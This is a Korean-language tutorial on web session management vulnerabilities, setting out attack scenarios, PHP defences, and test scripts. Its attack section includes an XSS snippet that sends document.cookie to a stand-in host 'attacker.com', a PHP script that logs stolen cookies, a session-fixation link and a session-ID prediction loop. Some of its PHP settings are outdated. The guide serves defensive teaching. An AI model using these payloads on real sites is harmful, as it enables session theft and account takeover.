# Session Management 취약점 분석

## 📋 취약점 개요

**Session Management 취약점**은 웹 애플리케이션이 사용자 세션을 부적절하게 관리할 때 발생하는 보안 취약점입니다. 세션 ID의 예측 가능성, 고정, 노출 등으로 인해 공격자가 다른 사용자의 세션을 탈취하거나 조작할 수 있습니다.

### 🎯 공격 원리

1. **세션 하이재킹**: 유효한 세션 ID 탈취
2. **세션 고정**: 공격자가 정한 세션 ID 강제 사용
3. **세션 예측**: 예측 가능한 세션 ID 생성 패턴 악용
4. **세션 노출**: 안전하지 않은 전송이나 저장

### 🔍 주요 위험성

- **CVSS 점수**: 7.5 (High)
- **계정 탈취**: 다른 사용자의 계정으로 로그인
- **권한 상승**: 관리자 권한 획득
- **개인정보 유출**: 민감한 사용자 데이터 접근

## 🚨 공격 시나리오

### 시나리오 1: 세션 하이재킹 (Session Hijacking)

```javascript
// XSS를 통한 세션 쿠키 탈취
<script>
var sessionCookie = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal.php?cookie=' + sessionCookie, true);
xhr.send();
</script>
```

```php
<?php
// 공격자 서버에서 쿠키 수집
// steal.php
$stolen_cookie = $_GET['cookie'];
file_put_contents('stolen_sessions.txt', $stolen_cookie . "\n", FILE_APPEND);
?>
```

### 시나리오 2: 세션 고정 (Session Fixation)

```html
<!-- 공격자가 피해자에게 특정 세션 ID를 강제 -->
<a href="http://victim-site.com/login.php?PHPSESSID=ATTACKER_CONTROLLED_ID">
    로그인하세요
</a>
```

```php
<?php
// 취약한 로그인 처리
session_start(); // 기존 세션 ID를 그대로 사용
if ($_POST['username'] && $_POST['password']) {
    // 인증 성공 시 세션 ID 재생성 없음
    $_SESSION['user'] = $_POST['username'];
}
?>
```

### 시나리오 3: 예측 가능한 세션 ID

```php
<?php
// 취약한 세션 ID 생성
$session_id = md5($user_id . time()); // 예측 가능
$session_id = $user_id . "_" . date('YmdH'); // 매우 예측 가능

// 공격자의 세션 ID 예측
for ($i = 0; $i < 3600; $i++) {
    $predicted_id = md5($target_user_id . (time() - $i));
    // 예측된 ID로 접근 시도
}
?>
```

### 시나리오 4: 세션 타임아웃 부재

```php
<?php
// 세션이 무제한으로 유지되는 취약점
session_start();
if (isset($_SESSION['user'])) {
    // 세션 만료 시간 확인 없음
    echo "환영합니다, " . $_SESSION['user'];
}
?>
```

## 🛡️ 방어 방법

### 1. 안전한 세션 설정

```php
<?php
// 안전한 세션 설정
ini_set('session.cookie_httponly', 1);  // XSS 방지
ini_set('session.cookie_secure', 1);    // HTTPS 전용
ini_set('session.use_strict_mode', 1);  // 엄격 모드
ini_set('session.cookie_samesite', 'Strict'); // CSRF 방지
ini_set('session.use_only_cookies', 1); // URL을 통한 세션 ID 전송 방지
ini_set('session.entropy_length', 32);  // 높은 엔트로피
ini_set('session.hash_function', 'sha256'); // 강력한 해시 함수

// 세션 타임아웃 설정
ini_set('session.gc_maxlifetime', 1800); // 30분
ini_set('session.cookie_lifetime', 0);   // 브라우저 종료시 삭제
?>
```

### 2. 세션 재생성 구현

```php
<?php
class SecureSessionManager {
    public function __construct() {
        $this->configureSession();
    }
    
    private function configureSession() {
        if (session_status() !== PHP_SESSION_ACTIVE) {
            // 보안 설정
            ini_set('session.cookie_httponly', 1);
            ini_set('session.cookie_secure', 1);
            ini_set('session.use_strict_mode', 1);
            ini_set('session.cookie_samesite', 'Strict');
            
            session_start();
        }
    }
    
    public function login($username, $password) {
        if ($this->authenticateUser($username, $password)) {
            // 세션 고정 공격 방지: 세션 ID 재생성
            session_regenerate_id(true);
            
            $_SESSION['user'] = $username;
            $_SESSION['login_time'] = time();
            $_SESSION['last_activity'] = time();
            
            // 세션 보안 토큰 생성
            $_SESSION['token'] = bin2hex(random_bytes(32));
            
            return true;
        }
        return false;
    }
    
    public function validateSession() {
        if (!isset($_SESSION['user'])) {
            return false;
        }
        
        // 세션 타임아웃 확인
        if (isset($_SESSION['last_activity']) && 
            (time() - $_SESSION['last_activity'] > 1800)) { // 30분
            $this->logout();
            return false;
        }
        
        // 절대 타임아웃 확인 (최대 세션 시간)
        if (isset($_SESSION['login_time']) && 
            (time() - $_SESSION['login_time'] > 7200)) { // 2시간
            $this->logout();
            return false;
        }
        
        // 활동 시간 업데이트
        $_SESSION['last_activity'] = time();
        
        // 주기적 세션 ID 재생성 (하이재킹 방지)
        if (!isset($_SESSION['last_regeneration'])) {
            $_SESSION['last_regeneration'] = time();
        } elseif (time() - $_SESSION['last_regeneration'] > 300) { // 5분
            session_regenerate_id(true);
            $_SESSION['last_regeneration'] = time();
        }
        
        return true;
    }
    
    public function logout() {
        if (session_status() === PHP_SESSION_ACTIVE) {
            // 세션 데이터 삭제
            $_SESSION = array();
            
            // 세션 쿠키 삭제
            if (ini_get("session.use_cookies")) {
                $params = session_get_cookie_params();
                setcookie(session_name(), '', time() - 42000,
                    $params["path"], $params["domain"],
                    $params["secure"], $params["httponly"]
                );
            }
            
            // 세션 파기
            session_destroy();
        }
    }
    
    public function getCSRFToken() {
        if (!isset($_SESSION['csrf_token'])) {
            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        }
        return $_SESSION['csrf_token'];
    }
    
    public function validateCSRFToken($token) {
        return isset($_SESSION['csrf_token']) && 
               hash_equals($_SESSION['csrf_token'], $token);
    }
    
    private function authenticateUser($username, $password) {
        // 실제 인증 로직 구현
        // 데이터베이스 확인, 패스워드 해시 검증 등
        return true; // 예시용
    }
}
?>
```

### 3. 세션 보안 미들웨어

```php
<?php
class SessionSecurityMiddleware {
    private $sessionManager;
    
    public function __construct(SecureSessionManager $sessionManager) {
        $this->sessionManager = $sessionManager;
    }
    
    public function handle($request, $next) {
        // IP 주소 변경 감지
        if (isset($_SESSION['ip_address'])) {
            if ($_SESSION['ip_address'] !== $_SERVER['REMOTE_ADDR']) {
                // IP 주소가 변경됨 - 잠재적 하이재킹
                $this->logSecurity('IP address changed', [
                    'old_ip' => $_SESSION['ip_address'],
                    'new_ip' => $_SERVER['REMOTE_ADDR'],
                    'user' => $_SESSION['user'] ?? 'unknown'
                ]);
                
                $this->sessionManager->logout();
                throw new SecurityException('Session security violation');
            }
        } else {
            $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
        }
        
        // User-Agent 변경 감지
        if (isset($_SESSION['user_agent'])) {
            if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
                $this->logSecurity('User agent changed', [
                    'old_ua' => $_SESSION['user_agent'],
                    'new_ua' => $_SERVER['HTTP_USER_AGENT'],
                    'user' => $_SESSION['user'] ?? 'unknown'
                ]);
                
                // User-Agent 변경은 경고만 (브라우저 업데이트 고려)
                // $this->sessionManager->logout();
            }
        } else {
            $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        }
        
        return $next($request);
    }
    
    private function logSecurity($event, $data) {
        $log_entry = [
            'timestamp' => date('Y-m-d H:i:s'),
            'event' => $event,
            'data' => $data,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT']
        ];
        
        error_log('SECURITY: ' . json_encode($log_entry));
    }
}
?>
```

### 4. 데이터베이스 기반 세션 저장

```php
<?php
class DatabaseSessionHandler implements SessionHandlerInterface {
    private $pdo;
    
    public function __construct(PDO $pdo) {
        $this->pdo = $pdo;
        session_set_save_handler($this, true);
    }
    
    public function open($save_path, $session_name) {
        return true;
    }
    
    public function close() {
        return true;
    }
    
    public function read($session_id) {
        $stmt = $this->pdo->prepare("
            SELECT data FROM sessions 
            WHERE id = ? AND expires > NOW()
        ");
        $stmt->execute([$session_id]);
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        
        return $result ? $result['data'] : '';
    }
    
    public function write($session_id, $session_data) {
        $stmt = $this->pdo->prepare("
            INSERT INTO sessions (id, data, expires, ip_address, user_agent) 
            VALUES (?, ?, DATE_ADD(NOW(), INTERVAL 30 MINUTE), ?, ?)
            ON DUPLICATE KEY UPDATE 
            data = VALUES(data), 
            expires = VALUES(expires),
            ip_address = VALUES(ip_address),
            user_agent = VALUES(user_agent)
        ");
        
        return $stmt->execute([
            $session_id,
            $session_data,
            $_SERVER['REMOTE_ADDR'],
            $_SERVER['HTTP_USER_AGENT']
        ]);
    }
    
    public function destroy($session_id) {
        $stmt = $this->pdo->prepare("DELETE FROM sessions WHERE id = ?");
        return $stmt->execute([$session_id]);
    }
    
    public function gc($maxlifetime) {
        $stmt = $this->pdo->prepare("DELETE FROM sessions WHERE expires < NOW()");
        return $stmt->execute();
    }
}

// 사용 예제
$pdo = new PDO($dsn, $username, $password);
$handler = new DatabaseSessionHandler($pdo);
?>
```

## 🧪 테스트 방법

### 1. 세션 하이재킹 테스트

```python
import requests
import re

# 1. 정상 로그인으로 세션 획득
session = requests.Session()
login_data = {'username': 'testuser', 'password': 'password'}
response = session.post('http://target.com/login.php', data=login_data)

# 2. 세션 ID 추출
session_id = None
for cookie in session.cookies:
    if cookie.name.startswith('PHPSESSID'):
        session_id = cookie.value
        break

print(f"Session ID: {session_id}")

# 3. 다른 브라우저에서 세션 ID 사용 시도
hijack_session = requests.Session()
hijack_session.cookies.set('PHPSESSID', session_id)
hijacked_response = hijack_session.get('http://target.com/profile.php')

if 'Welcome' in hijacked_response.text:
    print("Session hijacking successful!")
else:
    print("Session hijacking failed - good security!")
```

### 2. 세션 고정 테스트

```bash
# 1. 미리 정의된 세션 ID로 접근
curl -b "PHPSESSID=FIXED_SESSION_ID" \
     -d "username=victim&password=password" \
     http://target.com/login.php

# 2. 같은 세션 ID로 접근 확인
curl -b "PHPSESSID=FIXED_SESSION_ID" \
     http://target.com/profile.php
```

### 3. 세션 타임아웃 테스트

```python
import requests
import time

# 로그인
session = requests.Session()
session.post('http://target.com/login.php', 
            data={'username': 'test', 'password': 'test'})

# 30분 대기 (또는 더 짧게 테스트)
time.sleep(1800)  # 30분

# 세션이 만료되었는지 확인
response = session.get('http://target.com/protected.php')
if 'login' in response.url:
    print("Session timeout working correctly")
else:
    print("Session timeout not implemented")
```

## 📚 참고 자료

### 공식 문서
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PHP Session Security](https://www.php.net/manual/en/session.security.php)

### 보안 가이드
- [PortSwigger Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [NIST Authentication Guidelines](https://pages.nist.gov/800-63-3/)

### 도구 및 리소스
- [Burp Suite Session Handling](https://portswigger.net/burp/documentation/desktop/tools/proxy/options/sessions)
- [OWASP ZAP Session Management Tests](https://owasp.org/www-project-zap/)

---

## 🎯 핵심 요약

1. **세션 ID 재생성**: 로그인 시와 주기적으로 세션 ID 재생성
2. **안전한 쿠키 설정**: HttpOnly, Secure, SameSite 속성 사용
3. **세션 타임아웃**: 적절한 세션 만료 시간 설정
4. **보안 검증**: IP 주소, User-Agent 변경 모니터링

**⚠️ 주의**: 세션 관리는 웹 애플리케이션 보안의 핵심이므로 모든 보안 조치를 종합적으로 적용해야 합니다.